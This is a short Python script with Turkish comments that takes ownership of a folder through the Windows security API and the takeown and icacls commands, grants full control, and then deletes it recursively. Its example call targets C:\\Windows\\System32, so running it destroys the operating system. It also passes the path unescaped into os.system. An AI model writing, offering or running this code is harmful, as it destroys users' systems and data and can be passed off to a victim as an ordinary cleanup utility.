import os
import win32security
import win32file
import win32con
import shutil

def change_owner_and_delete_folder(folder_path):
    try:
        # Klasörün sahipliğini değiştir
        sd = win32security.GetFileSecurity(folder_path, win32security.OWNER_SECURITY_INFORMATION)
        admin_sid = win32security.LookupAccountName(None, "Administrators")[0]
        sd.SetSecurityDescriptorOwner(admin_sid, False)
        win32security.SetFileSecurity(folder_path, win32security.OWNER_SECURITY_INFORMATION, sd)

        # Alt klasörler ve dosyalar için sahipliği uygula
        os.system(f'takeown /F "{folder_path}" /A /R /D Y')

        # Yetkileri değiştir
        os.system(f'icacls "{folder_path}" /grant %username%:F /T')

        # Klasörü sil
        shutil.rmtree(folder_path)
        print(f"{folder_path} başarıyla silindi.")
    except Exception as e:
        print(f"Hata oluştu: {e}")

# Kullanım
folder_path = r"C:\\Windows\\System32"  # Silmek istediğiniz klasörün yolu
change_owner_and_delete_folder(folder_path)
